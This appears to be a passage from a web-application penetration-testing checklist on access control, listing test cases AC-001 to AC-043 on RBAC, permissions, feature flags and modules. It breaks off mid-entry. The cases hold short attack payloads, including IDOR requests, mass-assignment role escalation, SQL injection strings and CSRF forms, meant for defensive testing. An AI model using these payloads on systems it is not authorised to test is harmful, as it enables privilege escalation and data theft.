# 12. Access Control & Permission — Checklist

Feature-area security **test cases** for “12. Access Control & Permission”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*243 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## AC-001 — Vertical Privilege Escalation via Role Parameter
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Log in as regular user 2. Intercept request to access resource 3. Add or modify role parameter to admin 4. Attempt to access admin functionality

**Expected Result:** Application should ignore client-side role parameters

**Payload Example:**

```
{"user_id":123,role:"admin"} or role=administrator in URL
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-002 — Horizontal Privilege Escalation Between Same Roles
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Log in as User A with role X 2. Access User A's resources 3. Modify user_id to User B with same role 4. Access User B's resources

**Expected Result:** Users should only access their own resources

**Payload Example:**

```
GET /api/users/victim_user_id/data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-003 — Role Assignment IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Assign role to own account 2. Intercept request 3. Modify target user_id 4. Assign role to another user

**Expected Result:** Role assignment should verify admin privileges

**Payload Example:**

```
POST /api/users/victim_id/roles {"role":"admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-004 — Role Removal IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Remove role from own account 2. Modify target user_id 3. Remove role from admin account 4. Disable admin access

**Expected Result:** Role removal should verify permissions

**Payload Example:**

```
DELETE /api/users/admin_id/roles/admin
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-005 — Mass Assignment Role Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Update user profile 2. Add role field to request 3. Escalate to higher role 4. Access elevated features

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"name":"test",email:"test@test.com",role:"superadmin"}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## AC-006 — Role Hierarchy Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Identify role hierarchy 2. As lower role access higher role functions 3. Bypass role restrictions 4. Execute privileged actions

**Expected Result:** Role hierarchy should be enforced

**Payload Example:**

```
Moderator accessing admin endpoints
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-007 — Default Role Exploitation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Register new account 2. Check assigned default role 3. Exploit excessive default permissions 4. Access restricted features

**Expected Result:** Default roles should have minimal permissions

**Payload Example:**

```
New user with excessive default access
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-008 — Role Caching Vulnerability
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. User has admin role 2. Admin removes user's admin role 3. User continues using cached role 4. Access admin features after revocation

**Expected Result:** Role changes should invalidate sessions

**Payload Example:**

```
Access admin after role removal
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Multiple Sessions

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-009 — Role Enumeration via Error Messages
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Request with invalid role 2. Analyze error messages 3. Enumerate valid roles 4. Map role structure

**Expected Result:** Error messages should be generic

**Payload Example:**

```
Different errors for valid vs invalid roles
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AC-010 — CSRF on Role Assignment
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Create malicious page with role assignment form 2. Admin visits page 3. Role assigned without consent 4. Privilege escalation

**Expected Result:** Role changes should require CSRF token

**Payload Example:**

```
<form action="/admin/users/123/assign-role" method="POST"><input name="role" value="admin"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AC-011 — SQL Injection in Role Query
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Intercept role check request 2. Inject SQL in role parameter 3. Bypass role check 4. Extract role data

**Expected Result:** Role queries should be parameterized

**Payload Example:**

```
role=admin' OR '1'='1'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AC-012 — Role Inheritance Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Identify role inheritance structure 2. Access child role as parent 3. Bypass inheritance restrictions 4. Gain unintended access

**Expected Result:** Inheritance should be properly implemented

**Payload Example:**

```
Parent role accessing child-only resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-013 — Temporary Role Persistence
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Assign temporary role 2. Wait for expiration 3. Check if role persists 4. Access after expiration

**Expected Result:** Temporary roles should expire properly

**Payload Example:**

```
Access features after temp role expired
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-014 — Role-Based API Endpoint Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Map role-restricted API endpoints 2. Access directly without role check 3. Bypass frontend restrictions 4. Execute admin functions

**Expected Result:** All endpoints should check roles

**Payload Example:**

```
Direct API call bypassing UI role check
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-015 — Role Conflict Exploitation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Role-Based Access (RBAC)

**Test Steps:** 1. Assign conflicting roles 2. Check permission resolution 3. Exploit conflict for elevation 4. Access restricted resources

**Expected Result:** Conflicting roles should be prevented

**Payload Example:**

```
User with both "blocked" and "admin" roles
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## AC-016 — Permission Parameter Tampering
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Access resource with permission check 2. Intercept and modify permission parameter 3. Bypass permission validation 4. Access unauthorized resource

**Expected Result:** Permissions should be server-validated

**Payload Example:**

```
{"permission":"read"} changed to {"permission":"write"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-017 — Permission IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. View own permissions 2. Modify user_id parameter 3. View or modify another user's permissions 4. Elevate victim's permissions

**Expected Result:** Permission access should verify ownership

**Payload Example:**

```
GET /api/users/victim_id/permissions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-018 — Permission Inheritance Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. User has inherited permissions 2. Modify inheritance chain 3. Bypass permission inheritance 4. Access without proper permission

**Expected Result:** Inheritance should be properly enforced

**Payload Example:**

```
Access resource by breaking inheritance
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-019 — Negative Permission Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. User has explicit deny permission 2. Attempt access through alternate route 3. Bypass deny permission 4. Access restricted resource

**Expected Result:** Deny permissions should be absolute

**Payload Example:**

```
Bypass deny via different API version
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-020 — Permission Grant IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Grant permission to own account 2. Intercept request 3. Modify target user_id 4. Grant permission to another user

**Expected Result:** Permission grants should verify authority

**Payload Example:**

```
POST /api/permissions/grant {"user_id":"victim",permission:"admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-021 — Permission Revoke IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Revoke own permission 2. Modify target user_id 3. Revoke admin's permission 4. Disable administrative access

**Expected Result:** Permission revocation should verify authority

**Payload Example:**

```
DELETE /api/users/admin_id/permissions/manage_users
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-022 — Wildcard Permission Exploitation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. User granted specific permission 2. Test with wildcard pattern 3. Access resources matching wildcard 4. Expand access scope

**Expected Result:** Wildcard permissions should be restricted

**Payload Example:**

```
permission=*.read granting access to all resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-023 — Permission Scope Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Permission granted for specific scope 2. Access resource outside scope 3. Bypass scope restriction 4. Access cross-scope data

**Expected Result:** Permission scope should be enforced

**Payload Example:**

```
Project A permission accessing Project B data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-024 — Permission Caching Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Revoke user's permission 2. User continues with cached permission 3. Access after revocation 4. Exploit cache delay

**Expected Result:** Permission changes should be immediate

**Payload Example:**

```
Access resource after permission revoked
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Multiple Sessions

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-025 — Mass Permission Assignment
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Find bulk permission endpoint 2. Assign permissions to multiple users 3. Escalate many accounts 4. Create backdoor accounts

**Expected Result:** Bulk operations should be admin-only

**Payload Example:**

```
POST /api/permissions/bulk {"users":["id1",id2],permission:"admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-026 — Permission Check Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Permission being revoked 2. Simultaneously access resource 3. Win race condition 4. Access during revocation

**Expected Result:** Permission checks should be atomic

**Payload Example:**

```
Parallel access during permission change
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-027 — Dynamic Permission Manipulation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Identify dynamic permission evaluation 2. Manipulate evaluation context 3. Force permission grant 4. Access restricted features

**Expected Result:** Dynamic evaluation should be secure

**Payload Example:**

```
Modify context to satisfy permission check
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-028 — Permission Boundary Violation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Identify permission boundaries 2. Attempt cross-boundary access 3. Bypass boundary controls 4. Access isolated resources

**Expected Result:** Boundaries should be enforced

**Payload Example:**

```
Access resource in different permission boundary
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-029 — Default Permission Override
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Permission-Based Access

**Test Steps:** 1. Default permissions set 2. Attempt to override defaults 3. Gain elevated permissions 4. Access restricted functions

**Expected Result:** Default overrides should be restricted

**Payload Example:**

```
Override restrictive defaults with permissive ones
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-030 — Feature Flag Manipulation via Client
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Identify client-side feature flags 2. Modify flag values in request 3. Enable disabled features 4. Access hidden functionality

**Expected Result:** Feature flags should be server-controlled

**Payload Example:**

```
{"feature_new_dashboard":true} or localStorage manipulation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-031 — Feature Flag Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Intercept feature flag requests 2. Enumerate all flag names 3. Discover unreleased features 4. Test hidden functionality

**Expected Result:** Flag names should not reveal sensitive features

**Payload Example:**

```
GET /api/features returning all flag names
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / Postman

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AC-032 — Feature Flag IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. View own feature flags 2. Modify user_id 3. View or modify others' flags 4. Enable premium features for attacker

**Expected Result:** Flag access should be user-specific

**Payload Example:**

```
GET /api/users/victim_id/features
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-033 — Admin Feature Flag Bypass
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Identify admin-only features 2. Enable flag client-side 3. Access admin features 4. Perform admin actions

**Expected Result:** Admin flags should require admin role

**Payload Example:**

```
{"admin_panel_enabled":true} as regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-034 — Beta Feature Access Without Enrollment
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Identify beta features 2. Enable beta flag 3. Access without beta enrollment 4. Use unreleased features

**Expected Result:** Beta access should verify enrollment

**Payload Example:**

```
Enable beta_feature=true without beta user status
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-035 — Feature Flag Persistence Attack
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Enable feature flag 2. Flag disabled by admin 3. Check persistence 4. Continue using disabled feature

**Expected Result:** Flag changes should be immediate

**Payload Example:**

```
Access feature after flag disabled
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Multiple Sessions

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-036 — Feature Flag SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Feature flag stored in database 2. Inject SQL in flag name/value 3. Extract data 4. Manipulate flag logic

**Expected Result:** Flag queries should be parameterized

**Payload Example:**

```
flag_name='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AC-037 — Feature Flag Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Feature being toggled 2. Simultaneously access feature 3. Exploit timing window 4. Access during transition

**Expected Result:** Flag checks should be atomic

**Payload Example:**

```
Access during flag state change
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-038 — Feature Flag Configuration Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Find feature flag configuration 2. Access configuration file 3. Discover all flags and rules 4. Map feature access

**Expected Result:** Config should not be accessible

**Payload Example:**

```
/api/feature-flags/config or .feature-flags.json
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-039 — A/B Test Group Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Identify A/B test flags 2. Modify group assignment 3. Access preferred variant 4. Bypass test assignment

**Expected Result:** A/B groups should be server-assigned

**Payload Example:**

```
{"ab_test_group":"premium_variant"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-040 — Kill Switch Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Feature disabled via kill switch 2. Find alternate access method 3. Bypass kill switch 4. Use disabled feature

**Expected Result:** Kill switches should be absolute

**Payload Example:**

```
Access via old API version or direct endpoint
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-041 — Feature Flag CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Feature Flags / Toggles

**Test Steps:** 1. Create page toggling feature flags 2. Admin visits page 3. Flags modified without consent 4. Features enabled/disabled

**Expected Result:** Flag changes should require CSRF token

**Payload Example:**

```
<img src="https://target.com/admin/features/dangerous/enable">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AC-042 — Module Access IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Access authorized module 2. Modify module_id 3. Access unauthorized module 4. View restricted module data

**Expected Result:** Module access should verify permissions

**Payload Example:**

```
GET /api/modules/restricted_module_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-043 — Module Enable/Disable Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Module Access Control

**Test Steps:** 1. Module disabled for user 2. Access module directly via API 3. Bypass disable check 4. Use disabled module

